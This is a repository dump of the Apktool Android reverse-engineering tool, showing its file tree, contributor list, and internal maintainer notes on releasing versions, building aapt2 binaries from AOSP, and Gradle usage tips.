Project Path: arc_iBotPeaches_Apktool_j2rokjrq

Source Tree:

```txt
arc_iBotPeaches_Apktool_j2rokjrq
├── CONTRIBUTORS.md
├── INTERNAL.md
├── LICENSE.md
├── README.md
├── ROADMAP.md
├── SECURITY.md
├── brut.apktool
│   ├── apktool-cli
│   │   ├── build.gradle.kts
│   │   ├── proguard-rules.pro
│   │   └── src
│   │       └── main
│   │           ├── java
│   │           │   └── brut
│   │           │       └── apktool
│   │           │           └── Main.java
│   │           └── resources
│   │               └── apktool.properties
│   └── apktool-lib
│       ├── build.gradle.kts
│       └── src
│           ├── main
│           │   ├── java
│           │   │   └── brut
│           │   │       └── androlib
│           │   │           ├── ApkBuilder.java
│           │   │           ├── ApkDecoder.java
│           │   │           ├── Config.java
│           │   │           ├── exceptions
│           │   │           │   ├── AndrolibException.java
│           │   │           │   ├── FrameworkNotFoundException.java
│           │   │           │   ├── InFileNotFoundException.java
│           │   │           │   ├── NinePatchNotFoundException.java
│           │   │           │   ├── OutDirExistsException.java
│           │   │           │   ├── RawXmlEncounteredException.java
│           │   │           │   └── UndefinedResObjectException.java
│           │   │           ├── meta
│           │   │           │   ├── ApkInfo.java
│           │   │           │   ├── ResourcesInfo.java
│           │   │           │   ├── SdkInfo.java
│           │   │           │   ├── UsesFramework.java
│           │   │           │   └── VersionInfo.java
│           │   │           ├── res
│           │   │           │   ├── AaptInvoker.java
│           │   │           │   ├── AaptManager.java
│           │   │           │   ├── Framework.java
│           │   │           │   ├── ResDecoder.java
│           │   │           │   ├── data
│           │   │           │   │   ├── LayoutBounds.java
│           │   │           │   │   ├── NinePatchData.java
│           │   │           │   │   ├── ResChunkHeader.java
│           │   │           │   │   ├── ResStringPool.java
│           │   │           │   │   └── StyledString.java
│           │   │           │   ├── decoder
│           │   │           │   │   ├── BinaryResourceParser.java
│           │   │           │   │   ├── BinaryXmlResourceParser.java
│           │   │           │   │   ├── ManifestPullEventHandler.java
│           │   │           │   │   ├── ResChunkPullParser.java
│           │   │           │   │   ├── ResFileDecoder.java
│           │   │           │   │   ├── ResNinePatchStreamDecoder.java
│           │   │           │   │   ├── ResRawStreamDecoder.java
│           │   │           │   │   ├── ResStreamDecoder.java
│           │   │           │   │   └── ResXmlPullStreamDecoder.java
│           │   │           │   ├── table
│           │   │           │   │   ├── ResConfig.java
│           │   │           │   │   ├── ResEntry.java
│           │   │           │   │   ├── ResEntrySpec.java
│           │   │           │   │   ├── ResId.java
│           │   │           │   │   ├── ResOverlayable.java
│           │   │           │   │   ├── ResPackage.java
│           │   │           │   │   ├── ResPackageGroup.java
│           │   │           │   │   ├── ResTable.java
│           │   │           │   │   ├── ResType.java
│           │   │           │   │   ├── ResTypeSpec.java
│           │   │           │   │   └── value
│           │   │           │   │       ├── ResArray.java
│           │   │           │   │       ├── ResAttribute.java
│           │   │           │   │       ├── ResBag.java
│           │   │           │   │       ├── ResCustom.java
│           │   │           │   │       ├── ResEnum.java
│           │   │           │   │       ├── ResFileReference.java
│           │   │           │   │       ├── ResFlags.java
│           │   │           │   │       ├── ResItem.java
│           │   │           │   │       ├── ResPlural.java
│           │   │           │   │       ├── ResPrimitive.java
│           │   │           │   │       ├── ResReference.java
│           │   │           │   │       ├── ResString.java
│           │   │           │   │       ├── ResStyle.java
│           │   │           │   │       └── ResValue.java
│           │   │           │   └── xml
│           │   │           │       ├── ResStringEncoder.java
│           │   │           │       ├── ResXmlSerializer.java
│           │   │           │       ├── ResXmlUtils.java
│           │   │           │       └── ValuesXmlSerializable.java
│           │   │           └── smali
│           │   │               ├── SmaliBuilder.java
│           │   │               └── SmaliDecoder.java
│           │   └── resources
│           │       └── prebuilt
│           │           ├── android-framework.jar
│           │           ├── linux
│           │           │   └── aapt2
│           │           ├── macosx
│           │           │   └── aapt2
│           │           └── windows
│           │               └── aapt2.exe
│           └── test
│               ├── java
│               │   └── brut
│               │       └── androlib
│               │           ├── AndResGuardTest.java
│               │           ├── AndroidOreoNotSparseTest.java
│               │           ├── AndroidOreoSparseTest.java
│               │           ├── BaseTest.java
│               │           ├── BuildAndDecodeApkTest.java
│               │           ├── BuildAndDecodeJarTest.java
│               │           ├── CompactResourceTest.java
│               │           ├── DebuggableFalseChangeToTrueTest.java
│               │           ├── DebuggableTrueAddedTest.java
│               │           ├── DebuggableTrueRetainedTest.java
│               │           ├── DecodeArrayTest.java
│               │           ├── DecodeResolveTest.java
│               │           ├── DecodeResourcesTest.java
│               │           ├── DefaultBaksmaliVariableTest.java
│               │           ├── DexStaticFieldValueTest.java
│               │           ├── DoubleExtensionUnknownFileTest.java
│               │           ├── DynamicDexTest.java
│               │           ├── Empty9PatchTest.java
│               │           ├── EmptyArscTest.java
│               │           ├── EmptyResourcesArscTest.java
│               │           ├── ExternalEntityTest.java
│               │           ├── FrameworkTest.java
│               │           ├── LargeCompactResourceTest.java
│               │           ├── LargeIntsInManifestTest.java
│               │           ├── MinifiedArscTest.java
│               │           ├── MissingVersionManifestTest.java
│               │           ├── NetworkConfigTest.java
│               │           ├── NoNetworkConfigTest.java
│               │           ├── NonStandardPkgIdTest.java
│               │           ├── OutsideOfDirectoryEntryTest.java
│               │           ├── ParentDirectoryTraversalTest.java
│               │           ├── ProtectedChunksTest.java
│               │           ├── ProviderAttributeTest.java
│               │           ├── ReferenceVersionCodeTest.java
│               │           ├── ResourceDirectoryTraversalTest.java
│               │           ├── SharedLibraryTest.java
│               │           ├── SkipAssetTest.java
│               │           ├── SparseFlagTest.java
│               │           ├── UnknownCompressionTest.java
│               │           ├── VectorDrawableTest.java
│               │           ├── meta
│               │           │   ├── ApkInfoReaderTest.java
│               │           │   ├── ApkInfoSerializationTest.java
│               │           │   ├── ConsistentPropertyTest.java
│               │           │   ├── DoNotCompressHieroglyphTest.java
│               │           │   ├── InvalidSdkBoundingTest.java
│               │           │   ├── MaliciousYamlTest.java
│               │           │   └── YamlLineTest.java
│               │           ├── res
│               │           │   ├── AaptVersionTest.java
│               │           │   ├── data
│               │           │   │   └── StringPoolWithSurrogatePairInUtf8Test.java
│               │           │   ├── decoder
│               │           │   │   └── MissingDiv9PatchTest.java
│               │           │   └── xml
│               │           │       ├── EscapeXmlValueTest.java
│               │           │       └── PositionalSpecifiersTest.java
│               │           └── util
│               │               └── InvalidDirectoryTraversalTest.java
│               └── resources
│                   ├── arbitrary_write
│                   │   └── GHSA-2hqv-2xv4-5h5w.apk
│                   ├── doctype
│                   │   ├── AndroidManifest.xml
│                   │   └── apktool.yml
│                   ├── dynamic_dex
│                   │   └── dynamic_dex.apk
│                   ├── empty_9patch
│                   │   └── empty_9patch.apk
│                   ├── framework
│                   │   └── framework.apk
│                   ├── issue1157
│                   │   └── issue1157.apk
│                   ├── issue1170
│                   │   └── issue1170.apk
│                   ├── issue1234
│                   │   └── issue1234.apk
│                   ├── issue1244
│                   │   └── issue1244.apk
│                   ├── issue1264
│                   │   └── issue1264.apk
│                   ├── issue1456
│                   │   └── issue1456.apk
│                   ├── issue1481
│                   │   ├── apktool.yml
│                   │   └── smali
│                   │       └── com
│                   │           └── ibotpeaches
│                   │               └── issue1481
│                   │                   └── BuildConfig.smali
│                   ├── issue1498
│                   │   └── issue1498.apk
│                   ├── issue1589
│                   │   └── issue1589.apk
│                   ├── issue1594
│                   │   ├── not_sparse.apk
│                   │   └── sparse.apk
│                   ├── issue1605
│                   │   └── issue1605.apk
│                   ├── issue1680
│                   │   └── issue1680.apk
│                   ├── issue1730
│                   │   └── issue1730.apk
│                   ├── issue1994
│                   │   └── issue1994.apk
│                   ├── issue2328
│                   │   ├── debuggable-false
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   └── res
│                   │   │       └── values
│                   │   │           └── strings.xml
│                   │   ├── debuggable-missing
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   └── res
│                   │   │       └── values
│                   │   │           └── strings.xml
│                   │   └── debuggable-true
│                   │       ├── AndroidManifest.xml
│                   │       ├── apktool.yml
│                   │       └── res
│                   │           └── values
│                   │               └── strings.xml
│                   ├── issue2543
│                   │   ├── apktool.yml
│                   │   └── classes.dex
│                   ├── issue2701
│                   │   └── issue2701.apk
│                   ├── issue2836
│                   │   └── issue2836.apk
│                   ├── issue3366
│                   │   └── issue3366.apk
│                   ├── issue3705
│                   │   └── issue3705.apk
│                   ├── issue636
│                   │   └── issue636.apk
│                   ├── issue767
│                   │   └── issue767.apk
│                   ├── meta
│                   │   ├── basic.yml
│                   │   ├── cve20220476.yml
│                   │   ├── donotcompress_with_hieroglyph.yml
│                   │   ├── first_incorrect_indent.yml
│                   │   ├── list_with_indent.yml
│                   │   ├── skip_incorrect_indent.yml
│                   │   ├── standard.yml
│                   │   ├── unknown_fields.yml
│                   │   └── unknown_files.yml
│                   ├── network_config
│                   │   ├── existing
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   ├── res
│                   │   │   │   ├── drawable-hdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-ldpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-mdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-nodpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-xhdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── values
│                   │   │   │   │   ├── public.xml
│                   │   │   │   │   └── strings.xml
│                   │   │   │   └── xml
│                   │   │   │       └── network_security_config.xml
│                   │   │   └── smali
│                   │   │       └── HelloWorld.smali
│                   │   └── none
│                   │       ├── AndroidManifest.xml
│                   │       ├── apktool.yml
│                   │       ├── res
│                   │       │   ├── drawable-hdpi
│                   │       │   │   └── ic_launcher.png
│                   │       │   ├── drawable-ldpi
│                   │       │   │   └── ic_launcher.png
│                   │       │   ├── drawable-mdpi
│                   │       │   │   └── ic_launcher.png
│                   │       │   ├── drawable-nodpi
│                   │       │   │   └── ic_launcher.png
│                   │       │   ├── drawable-xhdpi
│                   │       │   │   └── ic_launcher.png
│                   │       │   └── values
│                   │       │       ├── public.xml
│                   │       │       └── strings.xml
│                   │       └── smali
│                   │           └── HelloWorld.smali
│                   ├── pkgid8
│                   │   ├── AndroidManifest.xml
│                   │   ├── apktool.yml
│                   │   └── res
│                   │       └── values
│                   │           ├── integers.xml
│                   │           ├── public.xml
│                   │           └── strings.xml
│                   ├── protected_chunks
│                   │   └── protected_chunks.apk
│                   ├── res
│                   │   └── decoder
│                   │       └── issue1522
│                   │           └── pip_dismiss_scrim.9.png
│                   ├── shared_library
│                   │   ├── client.apk
│                   │   └── library.apk
│                   ├── sparse
│                   │   ├── not-sparse.apk
│                   │   └── sparse.apk
│                   ├── testapp
│                   │   ├── AndroidManifest.xml
│                   │   ├── apktool.yml
│                   │   ├── assets
│                   │   │   ├── 0byte_file.jpg
│                   │   │   ├── txt
│                   │   │   │   └── no-unicode.txt
│                   │   │   └── unicode-txt
│                   │   │       └── ∂-unicode.txt
│                   │   ├── lib
│                   │   │   └── android-support-v13.jar
│                   │   ├── res
│                   │   │   ├── drawable
│                   │   │   │   ├── $avd_hide_password__0.xml
│                   │   │   │   ├── $avd_show_password__0.xml
│                   │   │   │   ├── $avd_show_password__1.xml
│                   │   │   │   ├── $avd_show_password__2.xml
│                   │   │   │   └── avd_show_password.xml
│                   │   │   ├── drawable-534dpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-anydpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-hdpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-ldpi
│                   │   │   │   ├── data.jpg
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-mdpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-nodpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-tvdpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-xhdpi
│                   │   │   │   ├── btn_zoom_up_normal.9.png
│                   │   │   │   ├── ic_launcher.png
│                   │   │   │   └── ninepatch.9.png
│                   │   │   ├── drawable-xxhdpi
│                   │   │   │   ├── ic_launcher.png
│                   │   │   │   ├── ic_notification_overlay.9.png
│                   │   │   │   ├── recents_lower_gradient.9.png
│                   │   │   │   ├── screenshot_panel.9.png
│                   │   │   │   ├── search_bg_transparent.9.png
│                   │   │   │   ├── status_background.9.png
│                   │   │   │   └── textfield_activated_holo_dark.9.png
│                   │   │   ├── drawable-xxhdpi-v4
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── drawable-xxxhdpi
│                   │   │   │   └── ic_launcher.png
│                   │   │   ├── font
│                   │   │   │   ├── lobster.xml
│                   │   │   │   └── lobster_regular.otf
│                   │   │   ├── layout
│                   │   │   │   ├── issue1040.xml
│                   │   │   │   ├── issue1063.xml
│                   │   │   │   ├── issue1157.xml
│                   │   │   │   ├── issue1274.xml
│                   │   │   │   └── issue1674.xml
│                   │   │   ├── navigation
│                   │   │   │   └── nav_graph.xml
│                   │   │   ├── raw
│                   │   │   │   ├── blank_test.png
│                   │   │   │   ├── no_extension
│                   │   │   │   └── rain.mp3
│                   │   │   ├── values
│                   │   │   │   ├── attrs.xml
│                   │   │   │   ├── colors.xml
│                   │   │   │   ├── integers.xml
│                   │   │   │   ├── overlayable.xml
│                   │   │   │   ├── public.xml
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-ar-rXB
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-ast
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-ast-rES
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+ast+Hant+IT+arabext
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+ast+Latn+IT+arevela
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+de+CH+1901
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+en+Latn+419
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+en+Latn+US
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+en+US+posix
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+eng+419
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-b+iw+660
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-en
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-en-rUS
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-feminine
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-fr
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-ldrtl
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-lowdr-v26
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc001
│                   │   │   │   ├── anims.xml
│                   │   │   │   ├── arrays.xml
│                   │   │   │   ├── bools.xml
│                   │   │   │   ├── colors.xml
│                   │   │   │   ├── dimens.xml
│                   │   │   │   ├── drawables.xml
│                   │   │   │   ├── ids.xml
│                   │   │   │   ├── integers.xml
│                   │   │   │   ├── layouts.xml
│                   │   │   │   ├── plurals.xml
│                   │   │   │   ├── strings.xml
│                   │   │   │   └── styles.xml
│                   │   │   ├── values-mcc001-mnc00
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc001-mnc01
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc002
│                   │   │   │   ├── arrays.xml
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc003
│                   │   │   │   ├── arrays.xml
│                   │   │   │   ├── bools.xml
│                   │   │   │   ├── integers.xml
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc004-mnc04-en-rUS-ldrtl-sw100dp-w200dp-h300dp-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key-navhidden-dpad-v26
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc238-mnc06
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mcc238-mnc870
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-mnc01
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-neuter
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-notround
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-nowidecg-v26
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-round
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-vrheadset-v26
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-watch
│                   │   │   │   └── strings.xml
│                   │   │   ├── values-widecg-v26
│                   │   │   │   └── strings.xml
│                   │   │   └── xml
│                   │   │       ├── accessibility_service_config.xml
│                   │   │       ├── literals.xml
│                   │   │       ├── references.xml
│                   │   │       └── ww_box_styles_schema.xsd
│                   │   ├── smali
│                   │   │   ├── HelloWorld.smali
│                   │   │   └── MainActivity.smali
│                   │   ├── smali_classes2
│                   │   │   └── HelloDualDexSupport.smali
│                   │   ├── smali_classes3
│                   │   │   └── HelloTripleDexSupport.smali
│                   │   └── unknown
│                   │       ├── AssetBundle
│                   │       │   ├── assets
│                   │       │   │   └── a.txt
│                   │       │   └── b.txt
│                   │       ├── hidden.file
│                   │       ├── lib_bug603
│                   │       │   └── bug603
│                   │       ├── nonprintable.file
│                   │       ├── stored.file
│                   │       └── unk_folder
│                   │           └── unknown_file
│                   ├── testjar
│                   │   ├── apktool.yml
│                   │   ├── original
│                   │   │   └── META-INF
│                   │   │       └── MANIFEST.MF
│                   │   └── smali
│                   │       └── com
│                   │           └── apktool
│                   │               └── test
│                   │                   └── Test.smali
│                   ├── unknown_compression
│                   │   └── unknown_compression.apk
│                   └── util
│                       └── traversal
│                           └── file
├── brut.j.common
│   ├── build.gradle.kts
│   └── src
│       ├── main
│       │   └── java
│       │       └── brut
│       │           └── common
│       │               ├── BrutException.java
│       │               └── Log.java
│       └── templates
│           └── apache2.0-header.txt
├── brut.j.dir
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── brut
│                   └── directory
│                       ├── Directory.java
│                       ├── DirectoryException.java
│                       ├── ExtFile.java
│                       ├── FileDirectory.java
│                       ├── PathAlreadyExists.java
│                       ├── PathNotExist.java
│                       └── ZipRODirectory.java
├── brut.j.util
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── brut
│                   └── util
│                       ├── BackgroundWorker.java
│                       ├── BinaryDataInputStream.java
│                       ├── BrutIO.java
│                       ├── Jar.java
│                       ├── OS.java
│                       ├── OSDetection.java
│                       ├── TextUtils.java
│                       └── ZipUtils.java
├── brut.j.xml
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── brut
│                   ├── xml
│                   │   └── XmlUtils.java
│                   └── xmlpull
│                       └── XmlPullUtils.java
├── brut.j.yaml
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── brut
│                   └── yaml
│                       ├── YamlLine.java
│                       ├── YamlReader.java
│                       ├── YamlSerializable.java
│                       ├── YamlStringEscapeUtils.java
│                       └── YamlWriter.java
├── build.gradle.kts
├── gradle
│   ├── libs.versions.toml
│   ├── scripts
│   │   └── publishing.gradle
│   └── wrapper
│       ├── gradle-wrapper.jar
│       └── gradle-wrapper.properties
├── gradlew
├── gradlew.bat
├── scripts
│   ├── linux
│   │   └── apktool
│   ├── osx
│   │   └── apktool
│   └── windows
│       └── apktool.bat
└── settings.gradle.kts

```

`CONTRIBUTORS.md`:

```md
# Apktool Contributors

This product includes software developed by:

  * Connor Tumbleson (connor.tumbleson@gmail.com)
  * Ryszard Wiśniewski (brut.alll@gmail.com)
  * Google (https://github.com/google/smali)
  * JesusFreke (https://github.com/JesusFreke/smali)
  * Dmitry Skiba (https://code.google.com/p/android4me/)
  * Tahseen Ur Rehman (https://code.google.com/p/radixtree/)
  * Android Open Source Project (https://source.android.com/)
  * The Apache Software Foundation (https://www.apache.org/)

```

`INTERNAL.md`:

```md
# Releasing a new version.

The steps taken for slicing an official release of Apktool.

### Ensuring proper license headers

_Currently broken after movement to kotlin dsl._

### Tagging the release.

Inside `build.gradle` there are two lines.

    version
    suffix

The version variable should be left unchanged. If done correctly, it will already be the version
you are about to release. In this case `2.2.2`. The suffix variable should read `SNAPSHOT` as
the `2.2.2` release up until this point was `SNAPSHOT` releases (Unofficial).

We need to remove the `SNAPSHOT` portion and leave the minor version blank. An example can be
found [here](https://github.com/iBotPeaches/Apktool/commit/96b70d0be7513c5a1e5d3a3b9a75e4e2b076ad79).

After we remove `SNAPSHOT` we need to make the version commit. Organization and following patterns
is crucial here. This commit should have 1 change only - the change above. Now commit this change
with the commit message - `version bump (x.x.x)`.

At this point we now have the commit of the release, but we need to tag it using the following message.

    git tag -a vx.x.x -m "changed version to vx.x.x" -s

For example for the `2.2.1` release.

    git tag -a v2.2.1 -m "changed version to v2.2.1" -s

### Prepare for publishing.

New to Apktool is publishing releases to Maven, so plugin authors can directly integrate. You
need a `gradle.properties` file in root with the structure:

```
signing.keyId={gpgKeyId}
signing.password={gpgPassphrase}
signing.secretKeyRingFile={gpgSecretKingRingLocation}

ossrhUsername={sonatypeUsername}
ossrhPassword={sonatypePassword}
```

Release with maven with `./gradlew build shadowJar release publish`.

### Building the binary.

> [!IMPORTANT]
> In order to publish Maven artifacts you need JDK 11+.

In order to maintain a clean slate. Run `gradlew clean` to start from a clean slate. Now lets build
the new binary version. We should not have any new commits since the tagged commit.

    ./gradlew build shadowJar proguard release

The build should tell you what version you are building, and it should match the commits you made previously.

    ➜ Apktool git:(main) ./gradlew build shadowJar proguard release
    Building RELEASE (main): 2.2.2

### Testing the binary.

Now the release binary is built in the same location as all other builds. Run this version against
some of the fixed bugs in this release. This is a simple test to ensure the build had no errors.

Copy the jar to any location to prep for uploading. The pattern we name the jars is

    apktool_x.x.x.jar

Or in the case of the last release - `apktool_2.2.1.jar`

Once you have the jar in this form. Record the md5 hash & sha256 hash of it. This can be done using `md5sum`
and `sha256sum` on unix systems.

This can be shown for the `2.2.2` release like so

    ➜  Desktop md5sum apktool_2.2.2.jar
    1e6be08d3f9bb4b442bb85cf4e21f1c1  apktool_2.2.2.jar

    ➜  Desktop sha256sum apktool-2.2.2.jar
    1f1f186edcc09b8677bc1037f3f812dff89077187b24c8558ca2a89186ea3251  apktool-2.2.2.jar

Remember these hashes. These are the local hashes. These are our main hashes. All others (Bitbucket, Backup)
must match these. If they do not - they are invalid.

### Lets get uploading.

Lets make sure we actually pushed these release changes to the repo (Both Github & Bitbucket)

    git push origin main
    git push origin vx.x.x

    git push bitbucket master
    git push bitbucket vx.x.x

We upload the binaries into 3 places.

1. [Bitbucket Downloads](https://bitbucket.org/iBotPeaches/apktool/downloads)
2. [Github Releases](https://github.com/iBotPeaches/Apktool/releases) - Since `2.2.1`.
3. [Backup Mirror](https://connortumbleson.com/apktool/)
4. [Sonatype (Maven)](https://oss.sonatype.org)

#### Bitbucket

This one is pretty easy. Head to the URL attached to the hyperlink #1 above. There will be a "Add Files"
button on the top right of the page. Upload the `apktool_x.x.x.jar` file.

After it is uploaded. Immediately visit the page and download it. Check the `md5` for a match.

#### GitHub

This option will not work until the tag is pushed. You can head to this [page](https://github.com/iBotPeaches/Apktool/releases/new)
to draft a new release. The `Tag version` dropdown will have the new tag. In this case `v2.2.2`.

Select that option and make the title `Apktool vx.x.x`. There will be a description field on this release.
Hold tight, we link the release blog post in this field, but we can edit the release after the fact to add this.

Upload the binary `apktool_x.x.x.jar` and submit the release.

#### Backup Server

Access to this server is probably limited so this option may not be possible. SSH into the
`connortumbleson.com` server with username `connor`. Head to `public_html/apktool` and upload
the `apktool_x.x.x.jar` to it.

Now re-generate the md5/sha256 hashes for these files.

    md5sum *.jar > md5.md5sum
    sha256 *.jar > sha256.shasum

Check the `md5.md5sum` file for the hashes. The file will look something like this.

    6de3e097943c553da5db2e604bced332  apktool_1.4.10.jar
    ...
    1e6be08d3f9bb4b442bb85cf4e21f1c1  apktool_2.2.2.jar

Additionally check the `sha256.shasum` file for the hashes. This file will look almost identical to the above
except for containing sha256 hashes.

The hashes match so we are good with the backup server.

#### Sonatype

You'll want to log in and view the Staging repositories and confirm you see the recently made build. You'll want to:

 * Close it (Wait for audit report email)
 * Release it (Drop the staging repository)
 * Wait 20min - 2 hours for it to appear [here](https://mvnrepository.com/artifact/org.apktool/apktool-lib)

With those done, time to get writing the release post.

We currently blog the releases on the [Connor Tumbleson personal blog](https://connortumbleson.com/).
This may change and the formatting of these release posts change over time.

Some recent releases for understanding the pattern can be found below.

1. [2.2.1](https://connortumbleson.com/2016/10/18/apktool-v2-2-1-released/)
2. [2.2.0](https://connortumbleson.com/2016/08/07/apktool-v2-2-0-released/)
3. [2.0.2](https://connortumbleson.com/2015/10/12/apktool-v2-0-2-released/)
4. [2.0.0](https://connortumbleson.com/2015/04/20/apktool-v2-0-0-released/)

For obtaining commit authors and counts. The following command does the legwork:

    git shortlog -s -n --all --no-merges --since="05 Sept 2018"

Obviously replacing the date with the release date of the last version.

So write the post. I tend to always include the following:

1. Image of release for featured image when reshared on socials.
2. Quick sentence or two for SEO to describe the meat of this release.
3. Commit count and total for this release with author names.
4. Changelog linking to the bugs that were fixed.
5. Download including the md5/sha256 hash.
6. Link dump to Project Site, GitHub, Bug Tracker and XDA Thread.

Now that you've written this post. We need to go post it in places and update places where
Apktool is released.

### XDA Thread

We have a [thread](https://forum.xda-developers.com/showthread.php?t=1755243) on XDA Developers.
This thread follows the same pattern for all releases.

When writing a response to the XDA thread we follow another pattern of release notes. These examples
can be found below:

1. [2.2.2](https://forum.xda-developers.com/showpost.php?p=70687935&postcount=4635)
2. [2.2.1](http://forum.xda-developers.com/showpost.php?p=69188139&postcount=4478)
3. [2.0.0](http://forum.xda-developers.com/showpost.php?p=60255972&postcount=3063)

### Apktool Website

The Apktool project website has a few locations to update:

1. The homepage intro
2. The download link in header
3. Migrating `unreleased.mx` to a new blog post.

The easiest way to describe this is to just link to a [previous release](https://github.com/iBotPeaches/Apktool/pull/3146/files).

### Update Milestones

Now that we've released a version, we should hopefully have no more tickets in the release just published.
If there are, move those tickets to the next milestone.

You can head to [milestones](https://github.com/iBotPeaches/Apktool/milestones) to close the just
released version and create another.

I tend to create the next release (In this case `2.2.3`) with an ETA of 3 months in the future. This
is just a guideline but helps me to release a new version every 3 months.

### Social Spam

The final step is to send this release into the wild via some social posting. Head to the blog
where the release post was and send that link to Twitter, Google and whatever else you use.

Relax and watch the bug tracker.

# Building aapt2 binaries.

The steps taken for building our modified aapt2 binaries for apktool.

### Getting the modified `frameworks/base` repo.
First step is using the [platform_frameworks_base](https://github.com/iBotPeaches/platform_frameworks_base) repo.

While previously unorganized, the repo now follows the branch naming convention depending on the current Android version.
So `apktool_7.1` corresponds to the 7.1 Android release. This branch should work for all `android-7.1.x` tags for AOSP.

We didn't follow this naming convention until Android 7.1. So don't go looking for older versions. The current version
is `apktool-9.0.0`, which corresponds to the Android 9.0 (Pie) release.

This repo has a variety of changes applied. These changes range from disabling optimizations to lessening the rules
that aapt regularly has. We do this because apktool's job is to not fix apks, but rather keep them as close to the
original as they were.

### First we need the AOSP source

As cheesy as it is, just follow this [downloading](https://source.android.com/source/downloading.html) link in order
to get the source downloaded. This is no small download, expect to use 150-250GB.

Some optimization techniques for a smaller clone:

 * `~/bin/repo init -u https://android.googlesource.com/platform/manifest -b android16-release --partial-clone` - Partial clone
 * `repo sync -c` - Only current branch

After that, you need to build AOSP via this [documentation](https://source.android.com/source/building.html) guide. Now
we aren't building the entire AOSP package, the initial build is to just see if you are capable of building it.

We check out a certain tag or branch. Currently, we use

 * aapt2 - `android-16-release`

### Including our modified `frameworks/base` package.

There is probably a more automated way to do this, but for now:

1. `cd frameworks/base`
2. `git remote add origin git@github.com:iBotPeaches/platform_frameworks_base.git`
3. `git fetch origin -v`
4. `git checkout origin/apktool-{x}`

#### Mac Patch

Normally you'll be building this on a recent macOS that isn't supported. You'll want to follow these steps:

1. `vim build/soong/cc/config/darwin_host.go`
2. Find `darwinSupportedSdkVersions` array.
3. Add number that corresponds to output of: `find /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs -iname "*.sdk"`

### Building the aapt2 binary.

The steps below are different per flavor and operating system.

#### Linux / Windows
1. `source build/envsetup.sh`
1. `lunch aosp_cf_x86_64_only_phone-aosp_current-eng`
1. `m aapt2`
1. `strip out/host/linux-x86/bin/aapt2`
1. `strip out/host/linux-x86/bin/aapt2_64`
1. `strip out/host/windows-x86/bin/aapt2.exe`
1. `strip out/host/windows-x86/bin/aapt2_64.exe`

#### Mac
1. `export ANDROID_JAVA_HOME=/Path/To/Jdk`
1. `source build/envsetup.sh`
1. `lunch aosp_cf_x86_64_only_phone-aosp_current-eng`
1. `m aapt2`
1. `strip out/host/darwin-x86/bin/aapt2_64`

#### Confirming aapt/aapt2 builds are static

There are some issues with some dependencies (namely `libc++`) in which they are built in the shared state. This is
alright in the scope and context of AOSP/Android Studio, but once you leave those two behind and start using aapt on
its own, you encounter some issues. The key is to force `libc++` to be built statically which takes some tweaks with the
AOSP build systems as that dependency isn't standard like `libz` and others.

You can test the finalized project using tools like `ldd` (unix) and `otool -L` (mac) for testing the binaries looking
for shared dependencies.

# Gradle Tips n Tricks

    ./gradlew build shadowJar proguard -x test

This skips the testing suite (which currently takes 2-4 minutes). Use this when making quick builds and save the testing
suite before pushing to GitHub.

    ./gradlew test --debug-jvm

This enables debugging on the test suite. This starts the debugger on port 5005 which you can connect with IntelliJ.

    ./gradlew :brut.apktool:apktool-lib:test ---tests "*BuildAndDecodeTest"

This runs the library project of Apktool, selecting a specific test to run. Comes in handy when writing a new test and
only wanting to run that one. The asterisk is used to the full path to the test can be ignored. You can additionally
match this with the debugging parameter to debug a specific test. This command can be found below.

